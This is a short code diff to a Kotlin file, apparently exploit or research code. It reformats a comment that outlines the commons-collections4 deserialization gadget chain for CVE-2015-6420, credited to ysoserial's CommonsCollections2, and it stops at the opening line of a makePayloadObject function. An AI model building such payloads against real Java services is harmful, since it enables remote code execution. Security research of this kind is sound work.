@@ -19,14 +19,14 @@ fun main() {
 /*
     Vulnerability: https://advisory.checkmarx.net/advisory/vulnerability/CVE-2015-6420/ in org.apache.commons:commons-collections4:4.0
     Credits: https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2.java
-	Gadget chain:
+    Gadget chain:
 		ObjectInputStream.readObject()
 			PriorityQueue.readObject()
 				...
 					TransformingComparator.compare()
 						InvokerTransformer.transform()
 						    ...
-							    <clinit> (static initializer) call our class
+							    <clinit> (static initializer) call of our injected class
  */
 fun makePayloadObject(): Any {
     val transformer = InvokerTransformer<Any?, Any?>("toString", arrayOf(), arrayOf())
